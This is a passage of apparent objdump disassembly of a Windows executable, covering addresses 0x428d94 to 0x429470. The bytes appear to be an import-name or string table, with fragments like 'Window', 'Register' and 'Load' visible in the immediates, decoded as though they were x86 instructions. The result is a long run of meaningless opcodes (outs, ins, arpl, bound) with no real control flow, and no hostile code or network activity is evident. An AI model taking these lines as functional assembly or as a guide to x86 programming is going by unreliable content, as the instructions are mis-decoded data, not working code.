  428d94:	dec    ecx
  428d95:	outs   dx,BYTE PTR ds:[esi]
  428d96:	push   edx
  428d97:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428d9c:	dec    edx
  428d9d:	add    dl,BYTE PTR [ebx+0x65]
  428da0:	je     0x428def
  428da2:	outs   dx,BYTE PTR gs:[esi]
  428da4:	jne    0x428dea
  428da6:	gs popaw 
  428da9:	jne    0x428e17
  428dab:	je     0x428df6
  428dad:	je     0x428e14
  428daf:	ins    DWORD PTR es:[edi],dx
  428db0:	add    BYTE PTR [eax],al
  428db2:	sti    
  428db3:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428db7:	arpl   WORD PTR [ebx+0x50],bp
  428dba:	outs   dx,DWORD PTR ds:[esi]
  428dbb:	jo     0x428e32
  428dbd:	jo     0x428e0c
  428dbf:	outs   dx,BYTE PTR gs:[esi]
  428dc1:	jne    0x428dc3
  428dc3:	add    BYTE PTR [ebp+0x64705502],ah
  428dc9:	popa   
  428dca:	je     0x428e31
  428dcc:	push   edi
  428dcd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428dd4:	push   ss
  428dd5:	add    dl,BYTE PTR [edx+0x65]
  428dd8:	ins    DWORD PTR es:[edi],dx
  428dd9:	outs   dx,DWORD PTR ds:[esi]
  428dda:	jbe    0x428e41
  428ddc:	dec    ebp
  428ddd:	outs   dx,BYTE PTR gs:[esi]
  428ddf:	jne    0x428de1
  428de1:	add    BYTE PTR [edx+0x61724400],dh
  428de7:	ja     0x428e2f
  428de9:	jb     0x428e4c
  428deb:	ins    DWORD PTR es:[edi],dx
  428dec:	gs inc ebx
  428dee:	outs   dx,DWORD PTR ds:[esi]
  428def:	outs   dx,BYTE PTR ds:[esi]
  428df0:	je     0x428e64
  428df2:	outs   dx,DWORD PTR ds:[esi]
  428df3:	ins    BYTE PTR es:[edi],dx
  428df4:	add    BYTE PTR [eax],al
  428df6:	mov    dl,0x1
  428df8:	dec    esp
  428df9:	outs   dx,DWORD PTR ds:[esi]
  428dfa:	popa   
  428dfb:	fs dec ecx
  428dfd:	ins    DWORD PTR es:[edi],dx
  428dfe:	popa   
  428dff:	addr16 gs push edi
  428e02:	add    BYTE PTR [eax],al
  428e04:	add    al,BYTE PTR [eax]
  428e06:	inc    ecx
  428e07:	fs push 0x75
  428e0a:	jae    0x428e80
  428e0c:	push   edi
  428e0d:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  428e14:	arpl   WORD PTR [eax+eax*1+0x0],si
  428e18:	add    DWORD PTR [ecx],0x65536e49
  428e1e:	outs   dx,BYTE PTR ds:[esi]
  428e1f:	fs dec ebp
  428e21:	gs jae 0x428e97
  428e24:	popa   
  428e25:	addr16 gs inc ebp
  428e28:	js     0x428e2a
  428e2a:	xchg   BYTE PTR [ecx],al
  428e2c:	dec    ecx
  428e2d:	outs   dx,BYTE PTR ds:[esi]
  428e2e:	jae    0x428e95
  428e30:	jb     0x428ea6
  428e32:	dec    ebp
  428e33:	outs   dx,BYTE PTR gs:[esi]
  428e35:	jne    0x428e8e
  428e37:	add    BYTE PTR ds:0x6c6c4100,al
  428e3d:	outs   dx,DWORD PTR ds:[esi]
  428e3e:	ja     0x428e93
  428e40:	gs je  0x428e89
  428e43:	outs   dx,DWORD PTR ds:[esi]
  428e44:	jb     0x428eab
  428e46:	addr16 jb 0x428eb8
  428e49:	jne    0x428eb9
  428e4b:	fs push edi
  428e4d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428e54:	add    BYTE PTR [edx],0x53
  428e57:	ja     0x428eba
  428e59:	jo     0x428ea8
  428e5b:	outs   dx,DWORD PTR ds:[esi]
  428e5c:	jne    0x428ed1
  428e5e:	gs inc edx
  428e60:	jne    0x428ed6
  428e62:	je     0x428ed3
  428e64:	outs   dx,BYTE PTR ds:[esi]
  428e65:	add    bh,ch
  428e67:	add    DWORD PTR [eax+0x65],edx
  428e6a:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  428e6f:	jae    0x428ed2
  428e71:	addr16 gs push edi
  428e74:	add    BYTE PTR [eax],al
  428e76:	cdq    
  428e77:	add    BYTE PTR [ecx+ebp*2+0x61],al
  428e7b:	ins    BYTE PTR es:[edi],dx
  428e7c:	outs   dx,DWORD PTR ds:[esi]
  428e7d:	addr16 inc edx
  428e7f:	outs   dx,DWORD PTR ds:[esi]
  428e80:	js     0x428ecb
  428e82:	outs   dx,BYTE PTR ds:[esi]
  428e83:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  428e8b:	jb     0x428eee
  428e8d:	ins    DWORD PTR es:[edi],dx
  428e8e:	inc    ecx
  428e8f:	add    BYTE PTR [ebp+0x0],bl
  428e92:	inc    ebx
  428e93:	jb     0x428efa
  428e95:	popa   
  428e96:	je     0x428efd
  428e98:	dec    ecx
  428e99:	arpl   WORD PTR [edi+0x6e],bp
  428e9c:	dec    ecx
  428e9d:	outs   dx,BYTE PTR ds:[esi]
  428e9e:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  428ea6:	stos   BYTE PTR es:[edi],al
  428ea7:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428eab:	fs inc edx
  428ead:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb1005770
  428eb5:	add    dl,BYTE PTR [esi+0x6b]
  428eb8:	dec    ebx
  428eb9:	gs jns 0x428f0f
  428ebc:	arpl   WORD PTR [ecx+0x6e],sp
  428ebf:	push   edi
  428ec0:	add    BYTE PTR [eax],al
  428ec2:	adc    eax,DWORD PTR [ecx]
  428ec4:	inc    edi
  428ec5:	gs je  0x428f0c
  428ec8:	outs   dx,DWORD PTR ds:[esi]
  428ec9:	jne    0x428f2d
  428ecb:	ins    BYTE PTR es:[edi],dx
  428ecc:	gs inc ebx
  428ece:	ins    BYTE PTR es:[edi],dx
  428ecf:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  428ed6:	add    BYTE PTR [eax],al
  428ed8:	add    WORD PTR [edi+0x65],ax
  428edc:	je     0x428f33
  428ede:	jae    0x428f45
  428ee0:	jb     0x428f31
  428ee2:	bound  ebp,QWORD PTR [edx+0x65]
  428ee5:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428ee9:	outs   dx,WORD PTR ds:[esi]
  428eeb:	jb     0x428f5a
  428eed:	popa   
  428eee:	je     0x428f59
  428ef0:	outs   dx,DWORD PTR ds:[esi]
  428ef1:	outs   dx,BYTE PTR ds:[esi]
  428ef2:	push   edi
  428ef3:	add    BYTE PTR [eax+0x1],bl
  428ef6:	inc    edi
  428ef7:	gs je  0x428f4d
  428efa:	jne    0x428f5e
  428efc:	dec    ebp
  428efd:	outs   dx,BYTE PTR gs:[esi]
  428eff:	jne    0x428f01
  428f01:	add    dh,dh
  428f03:	add    BYTE PTR [edi+0x65],al
  428f06:	je     0x428f4b
  428f08:	ins    BYTE PTR es:[edi],dx
  428f09:	popa   
  428f0a:	jae    0x428f7f
  428f0c:	dec    ecx
  428f0d:	outs   dx,BYTE PTR ds:[esi]
  428f0e:	outs   dx,WORD PTR ds:[esi]
  428f10:	inc    ebp
  428f11:	js     0x428f6a
  428f13:	add    BYTE PTR [ecx+eax*1],cl
  428f16:	inc    edi
  428f17:	gs je  0x428f5e
  428f1a:	gs jae 0x428f88
  428f1d:	je     0x428f8e
  428f1f:	jo     0x428f78
  428f21:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428f28:	sub    eax,0x6e655302
  428f2d:	fs dec esi
  428f2f:	outs   dx,DWORD PTR ds:[esi]
  428f30:	je     0x428f9b
  428f32:	data16 jns 0x428f82
  428f35:	gs jae 0x428fab
  428f38:	popa   
  428f39:	addr16 gs push edi
  428f3c:	add    BYTE PTR [eax],al
  428f3e:	and    al,BYTE PTR [edx]
  428f40:	push   ebx
  428f41:	outs   dx,BYTE PTR gs:[esi]
  428f43:	fs inc esp
  428f45:	ins    BYTE PTR es:[edi],dx
  428f46:	addr16 dec ecx
  428f48:	je     0x428faf
  428f4a:	ins    DWORD PTR es:[edi],dx
  428f4b:	dec    ebp
  428f4c:	gs jae 0x428fc2
  428f4f:	popa   
  428f50:	addr16 gs push edi
  428f53:	add    BYTE PTR [eax],ch
  428f55:	add    DWORD PTR [edi+0x65],eax
  428f58:	je     0x428fa6
  428f5a:	popa   
  428f5b:	jae    0x428fd1
  428f5d:	inc    ecx
  428f5e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428f62:	gs push eax
  428f64:	outs   dx,DWORD PTR ds:[esi]
  428f65:	jo     0x428fdc
  428f67:	jo     0x428f69
  428f69:	add    BYTE PTR [ecx],ch
  428f6b:	add    BYTE PTR [ebx+0x68],al
  428f6e:	popa   
  428f6f:	jb     0x428fbd
  428f71:	outs   dx,DWORD PTR ds:[esi]
  428f72:	ja     0x428fd9
  428f74:	jb     0x428fcd
  428f76:	add    BYTE PTR [eax],al
  428f78:	xor    al,BYTE PTR [ecx]
  428f7a:	inc    edi
  428f7b:	gs je  0x428fcb
  428f7e:	outs   dx,BYTE PTR gs:[esi]
  428f80:	jne    0x428fcb
  428f82:	je     0x428fe9
  428f84:	ins    DWORD PTR es:[edi],dx
  428f85:	inc    ebx
  428f86:	outs   dx,DWORD PTR ds:[esi]
  428f87:	jne    0x428ff7
  428f89:	je     0x428f8b
  428f8b:	add    BYTE PTR ds:0x74655302,bh
  428f91:	inc    esp
  428f92:	ins    BYTE PTR es:[edi],dx
  428f93:	addr16 dec ecx
  428f95:	je     0x428ffc
  428f97:	ins    DWORD PTR es:[edi],dx
  428f98:	dec    ecx
  428f99:	outs   dx,BYTE PTR ds:[esi]
  428f9a:	je     0x428f9c
  428f9c:	mov    al,ds:0x57734901
  428fa1:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428fa8:	mov    ds:0x57734901,al
  428fad:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  428fb4:	imul   esp,DWORD PTR [ebx+0x6f],0xe7006564
  428fbb:	add    DWORD PTR [edi+0x70],ecx
  428fbe:	outs   dx,BYTE PTR gs:[esi]
  428fc0:	inc    esp
  428fc1:	gs jae 0x42902f
  428fc4:	je     0x429035
  428fc6:	jo     0x42901f
  428fc8:	add    BYTE PTR [eax],al
  428fca:	cmp    al,BYTE PTR [eax]
  428fcc:	inc    ebx
  428fcd:	push   0x446b6365
  428fd2:	ins    BYTE PTR es:[edi],dx
  428fd3:	addr16 inc edx
  428fd5:	jne    0x42904b
  428fd7:	je     0x429048
  428fd9:	outs   dx,BYTE PTR ds:[esi]
  428fda:	add    BYTE PTR [eax],al
  428fdc:	mov    eax,DWORD PTR [ecx]
  428fde:	dec    ecx
  428fdf:	outs   dx,BYTE PTR ds:[esi]
  428fe0:	jbe    0x429047
  428fe2:	jb     0x429058
  428fe4:	push   edx
  428fe5:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428fea:	pop    DWORD PTR [eax]
  428fec:	inc    esp
  428fed:	gs push di
  428ff0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428ff7:	outs   dx,DWORD PTR ds:[esi]
  428ff8:	arpl   WORD PTR [edi+0x0],dx
  428ffb:	add    BYTE PTR ds:0x74654701,cl
  429001:	inc    esp
  429002:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  429009:	jae    0x429070
  42900b:	push   ebp
  42900c:	outs   dx,BYTE PTR ds:[esi]
  42900d:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x47016500
  429015:	gs je  0x42906d
  429018:	jae    0x42907f
  42901a:	jb     0x42906b
  42901c:	bound  ebp,QWORD PTR [edx+0x65]
  42901f:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  429023:	outs   dx,WORD PTR ds:[esi]
  429025:	jb     0x429094
  429027:	popa   
  429028:	je     0x429093
  42902a:	outs   dx,DWORD PTR ds:[esi]
  42902b:	outs   dx,BYTE PTR ds:[esi]
  42902c:	inc    ecx
  42902d:	add    BYTE PTR [ecx+0x44734901],bl
  429033:	ins    BYTE PTR es:[edi],dx
  429034:	addr16 inc edx
  429036:	jne    0x4290ac
  429038:	je     0x4290a9
  42903a:	outs   dx,BYTE PTR ds:[esi]
  42903b:	inc    ebx
  42903c:	push   0x656b6365
  429041:	add    BYTE PTR fs:[eax],al
  429044:	ins    DWORD PTR es:[edi],dx
  429045:	add    DWORD PTR [edi+0x65],eax
  429048:	je     0x4290a1
  42904a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  429051:	outs   dx,BYTE PTR ds:[esi]
  429052:	addr16 push edi
  429054:	add    BYTE PTR [eax],al
  429056:	popa   
  429057:	add    BYTE PTR [ebx+0x72],al
  42905a:	gs popa 
  42905c:	je     0x4290c3
  42905e:	push   eax
  42905f:	outs   dx,DWORD PTR ds:[esi]
  429060:	jo     0x4290d7
  429062:	jo     0x4290b1
  429064:	outs   dx,BYTE PTR gs:[esi]
  429066:	jne    0x429068
  429068:	sbb    eax,DWORD PTR [eax]
  42906a:	inc    ebx
  42906b:	popa   
  42906c:	ins    BYTE PTR es:[edi],dx
  42906d:	ins    BYTE PTR es:[edi],dx
  42906e:	push   edi
  42906f:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  429076:	outs   dx,DWORD PTR ds:[esi]
  429077:	arpl   WORD PTR [edi+0x0],dx
  42907a:	stos   DWORD PTR es:[edi],eax
  42907b:	add    BYTE PTR [edx+esi*2+0x61],al
  42907f:	ja     0x4290c2
  429081:	outs   dx,BYTE PTR ds:[esi]
  429082:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  429089:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  42908e:	sahf   
  42908f:	add    DWORD PTR [ecx+0x73],ecx
  429092:	push   edx
  429093:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  429098:	jo     0x42910e
  42909a:	jns    0x42909c
  42909c:	inc    BYTE PTR [eax]
  42909e:	inc    edi
  42909f:	gs je  0x4290e5
  4290a2:	ins    BYTE PTR es:[edi],dx
  4290a3:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4290aa:	jb     0x4290ac
  4290ac:	lds    eax,FWORD PTR [eax]
  4290ae:	inc    ebp
  4290af:	outs   dx,BYTE PTR ds:[esi]
  4290b0:	fs push eax
  4290b2:	popa   
  4290b3:	imul   ebp,DWORD PTR [esi+0x74],0xdc0000
  4290ba:	inc    ebp
  4290bb:	outs   dx,BYTE PTR ds:[esi]
  4290bc:	jne    0x42912b
  4290be:	push   edi
  4290bf:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4290c6:	xchg   DWORD PTR [ecx],eax
  4290c8:	dec    ecx
  4290c9:	outs   dx,BYTE PTR ds:[esi]
  4290ca:	je     0x429131
  4290cc:	jb     0x42913c
  4290ce:	popa   
  4290cf:	ins    BYTE PTR es:[edi],dx
  4290d0:	inc    edi
  4290d1:	gs je  0x42912b
  4290d4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4290db:	js     0x429151
  4290dd:	add    BYTE PTR [eax+0x43734901],dl
  4290e3:	push   0x6f4c7261
  4290e8:	ja     0x42914f
  4290ea:	jb     0x42912d
  4290ec:	add    BYTE PTR [eax],al
  4290ee:	aad    0x1
  4290f0:	dec    ebp
  4290f1:	gs jae 0x429167
  4290f4:	popa   
  4290f5:	addr16 gs inc edx
  4290f8:	outs   dx,DWORD PTR ds:[esi]
  4290f9:	js     0x429152
  4290fb:	add    BYTE PTR [edi+0x636f4c01],bh
  429101:	imul   edx,DWORD PTR [edi+0x69],0x6e
  429105:	outs   dx,DWORD PTR fs:[esi]
  429107:	ja     0x42915e
  429109:	jo     0x42916f
  42910b:	popa   
  42910c:	je     0x429173
  42910e:	add    BYTE PTR [eax],al
  429110:	add    BYTE PTR es:[ebx+0x68],al
  429114:	popa   
  429115:	jb     0x429163
  429117:	outs   dx,DWORD PTR ds:[esi]
  429118:	ja     0x42917f
  42911a:	jb     0x42915d
  42911c:	add    BYTE PTR [eax],al
  42911e:	call   0x6e6f:0x696e5502
  429125:	push   edx
  429126:	arpl   WORD PTR gs:[eax+eax*1+0x38],si
  42912b:	add    DWORD PTR [edi+0x65],eax
  42912e:	je     0x42917d
  429130:	outs   dx,BYTE PTR gs:[esi]
  429132:	jne    0x429187
  429134:	je     0x4291a8
  429136:	imul   ebp,DWORD PTR [esi+0x67],0xd9000041
  42913d:	add    DWORD PTR [ebp+0x6f],ecx
  429140:	outs   dx,BYTE PTR ds:[esi]
  429141:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  429149:	push   edx
  42914a:	arpl   WORD PTR gs:[eax+eax*1+0x6d],si
  42914f:	add    dl,BYTE PTR [ebx+0x65]
  429152:	je     0x4291ab
  429154:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  42915b:	outs   dx,BYTE PTR ds:[esi]
  42915c:	addr16 inc ecx
  42915e:	add    BYTE PTR [eax],al
  429160:	or     al,0x0
  429162:	inc    edx
  429163:	imul   ebp,DWORD PTR gs:[bp+0x44],0x72656665
  42916c:	push   edi
  42916d:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  429174:	jae    0x429176
  429176:	add    BYTE PTR cs:[ebx+0x68],al
  42917a:	popa   
  42917b:	jb     0x4291cd
  42917d:	jb     0x4291e4
  42917f:	jbe    0x4291c2
  429181:	add    bl,bl
  429183:	add    DWORD PTR [ebp+0x6f],ecx
  429186:	jbe    0x4291ed
  429188:	push   edi
  429189:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  429190:	mov    dh,0x1
  429192:	dec    esp
  429193:	outs   dx,DWORD PTR ds:[esi]
  429194:	popa   
  429195:	fs dec ebp
  429197:	outs   dx,BYTE PTR gs:[esi]
  429199:	jne    0x4291dc
  42919b:	add    BYTE PTR [ebp+0x79656b02],bh
  4291a1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  4291a5:	jbe    0x42920c
  4291a7:	outs   dx,BYTE PTR ds:[esi]
  4291a8:	je     0x4291aa
  4291aa:	pop    esp
  4291ab:	add    DWORD PTR [edi+0x65],eax
  4291ae:	je     0x429203
  4291b0:	jns    0x429225
  4291b2:	je     0x429219
  4291b4:	ins    DWORD PTR es:[edi],dx
  4291b5:	dec    ebp
  4291b6:	gs je  0x42922b
  4291b9:	imul   esp,DWORD PTR [ebx+0x73],0x1af0000
  4291c0:	dec    esp
  4291c1:	outs   dx,DWORD PTR ds:[esi]
  4291c2:	popa   
  4291c3:	fs dec ecx
  4291c5:	arpl   WORD PTR [edi+0x6e],bp
  4291c8:	inc    ecx
  4291c9:	add    BYTE PTR [ebx+0x1],al
  4291cc:	inc    edi
  4291cd:	gs je  0x42921e
  4291d0:	gs js  0x429247
  4291d3:	inc    esp
  4291d4:	ins    BYTE PTR es:[edi],dx
  4291d5:	addr16 push esp
  4291d7:	popa   
  4291d8:	bound  ecx,QWORD PTR [ecx+0x74]
  4291db:	gs ins DWORD PTR es:[edi],dx
  4291dd:	add    BYTE PTR [ebx+0x61724400],dh
  4291e3:	ja     0x42922e
  4291e5:	arpl   WORD PTR [edi+0x6e],bp
  4291e8:	add    BYTE PTR [eax],al
  4291ea:	std    
  4291eb:	add    BYTE PTR [edi+0x65],al
  4291ee:	je     0x429233
  4291f0:	ins    BYTE PTR es:[edi],dx
  4291f1:	imul   esp,DWORD PTR [ebp+0x6e],0x63655274
  4291f8:	je     0x4291fa
  4291fa:	add    DWORD PTR ds:[edi+0x65],eax
  4291fe:	je     0x42924d
  429200:	gs jae 0x429276
  429203:	popa   
  429204:	addr16 gs push edi
  429207:	add    BYTE PTR [edx+0x1],al
  42920a:	inc    edi
  42920b:	gs je  0x42925c
  42920e:	gs js  0x429285
  429211:	inc    esp
  429212:	ins    BYTE PTR es:[edi],dx
  429213:	addr16 inc edi
  429215:	jb     0x429286
  429217:	jne    0x429289
  429219:	dec    ecx
  42921a:	je     0x429281
  42921c:	ins    DWORD PTR es:[edi],dx
  42921d:	add    BYTE PTR ds:0x6c655202,dl
  429223:	gs popa 
  429225:	jae    0x42928c
  429227:	inc    esp
  429228:	inc    ebx
  429229:	add    BYTE PTR [ebp+0x53],dl
  42922c:	inc    ebp
  42922d:	push   edx
  42922e:	xor    esi,DWORD PTR [edx]
  429230:	cs fs ins BYTE PTR es:[edi],dx
  429233:	ins    BYTE PTR es:[edi],dx
  429234:	add    BYTE PTR [eax],al
  429236:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  42923a:	jbe    0x4292a1
  42923c:	inc    esi
  42923d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x71004178
  429245:	add    DWORD PTR [esi+0x69],eax
  429248:	outs   dx,BYTE PTR ds:[esi]
  429249:	fs push edx
  42924b:	gs jae 0x4292bd
  42924e:	jne    0x4292c2
  429250:	arpl   WORD PTR [ebp+0x45],sp
  429253:	js     0x4292ac
  429255:	add    BYTE PTR [ebx],dl
  429257:	add    al,0x53
  429259:	gs je  0x42929f
  42925c:	jne    0x4292d0
  42925e:	jb     0x4292c5
  429260:	outs   dx,BYTE PTR ds:[esi]
  429261:	je     0x4292a7
  429263:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42926a:	jns    0x4292ad
  42926c:	add    BYTE PTR [eax],al
  42926e:	sub    BYTE PTR [ebx+edx*2],al
  429271:	gs je  0x4292bc
  429274:	popa   
  429275:	outs   dx,BYTE PTR ds:[esi]
  429276:	fs ins BYTE PTR es:[edi],dx
  429278:	gs inc ebx
  42927a:	outs   dx,DWORD PTR ds:[esi]
  42927b:	jne    0x4292eb
  42927d:	je     0x42927f
  42927f:	add    BYTE PTR [ebx+0x6d6f4300],dh
  429285:	jo     0x4292e8
  429287:	jb     0x4292ee
  429289:	push   ebx
  42928a:	je     0x4292fe
  42928c:	imul   ebp,DWORD PTR [esi+0x67],0x52000041
  429293:	add    DWORD PTR [esi+0x69],eax
  429296:	ins    BYTE PTR es:[edi],dx
  429297:	gs push esp
  429299:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  4292a0:	arpl   WORD PTR [ecx+0x6c],sp
  4292a3:	inc    esi
  4292a4:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  4292ac:	cmp    eax,DWORD PTR [ebx+edx*2]
  4292af:	gs je  0x429305
  4292b2:	jns    0x429327
  4292b4:	je     0x42931b
  4292b6:	ins    DWORD PTR es:[edi],dx
  4292b7:	push   esp
  4292b8:	imul   ebp,DWORD PTR [ebp+0x65],0x47018e00
  4292bf:	gs je  0x429303
  4292c2:	inc    ebx
  4292c3:	push   eax
  4292c4:	add    BYTE PTR [eax],al
  4292c6:	arpl   WORD PTR [ecx],ax
  4292c8:	inc    esi
  4292c9:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  4292d0:	je     0x429318
  4292d2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x33f0000
  4292da:	dec    esp
  4292db:	outs   dx,DWORD PTR ds:[esi]
  4292dc:	popa   
  4292dd:	fs dec esp
  4292df:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  4292e6:	add    BYTE PTR [eax],al
  4292e8:	push   ss
  4292e9:	add    DWORD PTR [ebp+0x6e],eax
  4292ec:	je     0x429353
  4292ee:	jb     0x429333
  4292f0:	jb     0x42935b
  4292f2:	je     0x42935d
  4292f4:	arpl   WORD PTR [ecx+0x6c],sp
  4292f7:	push   ebx
  4292f8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4292fd:	outs   dx,BYTE PTR ds:[esi]
  4292fe:	add    BYTE PTR [eax],al
  429300:	cdq    
  429301:	add    DWORD PTR [edi+0x65],eax
  429304:	je     0x429349
  429306:	outs   dx,DWORD PTR ds:[esi]
  429307:	ins    DWORD PTR es:[edi],dx
  429308:	ins    DWORD PTR es:[edi],dx
  429309:	inc    ebx
  42930a:	outs   dx,DWORD PTR ds:[esi]
  42930b:	outs   dx,BYTE PTR ds:[esi]
  42930c:	imul   sp,WORD PTR [edi+0x0],0x188
  429312:	inc    esi
  429313:	jb     0x42937a
  429315:	gs push edx
  429317:	gs jae 0x429389
  42931a:	jne    0x42938e
  42931c:	arpl   WORD PTR [ebp+0x0],sp
  42931f:	add    BYTE PTR [eax+0x1],ah
  429322:	inc    esi
  429323:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  42932a:	je     0x429372
  42932c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x1930000
  429334:	inc    edi
  429335:	gs je  0x42937a
  429338:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  42933f:	jo     0x4293a6
  429341:	push   edi
  429342:	add    BYTE PTR [eax],al
  429344:	fiadd  WORD PTR [esp+ebp*2]
  429347:	jae    0x4293bd
  429349:	jb     0x4293b7
  42934b:	outs   dx,BYTE PTR gs:[esi]
  42934d:	push   edi
  42934e:	add    BYTE PTR [eax],al
  429350:	pop    ds
  429351:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  429355:	popa   
  429356:	ins    BYTE PTR es:[edi],dx
  429357:	push   ebx
  429358:	imul   edi,DWORD PTR [edx+0x65],0x47025700
  42935f:	gs je  0x4293b5
  429362:	jns    0x4293d7
  429364:	je     0x4293cb
  429366:	ins    DWORD PTR es:[edi],dx
  429367:	inc    esp
  429368:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42936f:	jns    0x4293b2
  429371:	add    BYTE PTR [esi+0x74654701],ah
  429377:	inc    ebx
  429378:	outs   dx,DWORD PTR ds:[esi]
  429379:	ins    DWORD PTR es:[edi],dx
  42937a:	jo     0x4293f1
  42937c:	je     0x4293e3
  42937e:	jb     0x4293ce
  429380:	popa   
  429381:	ins    DWORD PTR es:[edi],dx
  429382:	gs push edi
  429384:	add    BYTE PTR [eax],al
  429386:	rol    BYTE PTR [eax],cl
  429388:	inc    ebx
  429389:	jb     0x4293f0
  42938b:	popa   
  42938c:	je     0x4293f3
  42938e:	inc    esi
  42938f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  429397:	outs   dx,BYTE PTR ds:[esi]
  429398:	addr16 inc ecx
  42939a:	add    BYTE PTR [eax],al
  42939c:	retf   0x4300
  42939f:	jb     0x429406
  4293a1:	popa   
  4293a2:	je     0x429409
  4293a4:	inc    esp
  4293a5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4293ac:	jns    0x429405
  4293ae:	add    BYTE PTR [eax],al
  4293b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4293b1:	add    BYTE PTR [ebx+0x61],al
  4293b4:	outs   dx,BYTE PTR ds:[esi]
  4293b5:	arpl   WORD PTR [ebp+0x6c],sp
  4293b8:	push   edi
  4293b9:	popa   
  4293ba:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4293c2:	ins    DWORD PTR es:[edi],dx
  4293c3:	gs jb  0x4293c6
  4293c6:	add    al,0x2
  4293c8:	inc    edi
  4293c9:	gs je  0x429418
  4293cc:	outs   dx,DWORD PTR ds:[esi]
  4293cd:	arpl   WORD PTR [ecx+0x6c],sp
  4293d0:	gs dec ecx
  4293d2:	outs   dx,BYTE PTR ds:[esi]
  4293d3:	outs   dx,WORD PTR ds:[esi]
  4293d5:	inc    ecx
  4293d6:	add    BYTE PTR [eax],al
  4293d8:	xor    eax,0x766f4d03
  4293dd:	gs inc esi
  4293df:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47019d00
  4293e7:	gs je  0x42942d
  4293ea:	outs   dx,DWORD PTR ds:[esi]
  4293eb:	ins    DWORD PTR es:[edi],dx
  4293ec:	ins    DWORD PTR es:[edi],dx
  4293ed:	push   ebx
  4293ee:	je     0x429451
  4293f0:	je     0x429457
  4293f2:	add    BYTE PTR [eax],al
  4293f4:	mov    ah,0x3
  4293f6:	push   edx
  4293f7:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x61577265
  429400:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  429408:	ins    BYTE PTR es:[di],dx
  42940a:	gs dec edi
  42940c:	bound  ebp,QWORD PTR [edx+0x65]
  42940f:	arpl   WORD PTR [eax+eax*1+0x5d],si
  429413:	add    al,BYTE PTR [edi+0x65]
  429416:	je     0x42946b
  429418:	jns    0x42948d
  42941a:	je     0x429481
  42941c:	ins    DWORD PTR es:[edi],dx
  42941d:	push   esp
  42941e:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  429425:	jae    0x42949b
  429427:	ins    DWORD PTR es:[edi],dx
  429428:	outs   dx,BYTE PTR gs:[esi]
  42942a:	je     0x42942c
  42942c:	add    al,0x1
  42942e:	inc    esp
  42942f:	gs ins BYTE PTR es:[edi],dx
  429431:	gs je  0x429499
  429434:	inc    esi
  429435:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47024900
  42943d:	gs je  0x429493
  429440:	push   0x5074726f
  429445:	popa   
  429446:	je     0x4294b0
  429448:	dec    esi
  429449:	popa   
  42944a:	ins    DWORD PTR es:[edi],dx
  42944b:	gs inc ecx
  42944d:	add    BYTE PTR [edx],al
  42944f:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  429453:	gs je  0x4294bb
  429456:	inc    ebx
  429457:	jb     0x4294c2
  429459:	je     0x4294c4
  42945b:	arpl   WORD PTR [ecx+0x6c],sp
  42945e:	push   ebx
  42945f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  429464:	outs   dx,BYTE PTR ds:[esi]
  429465:	add    bl,ah
  429467:	add    BYTE PTR [ebx+0x72],al
  42946a:	gs popa 
  42946c:	je     0x4294d3
  42946e:	dec    esi
  42946f:	popa   
  429470:	ins    DWORD PTR es:[edi],dx
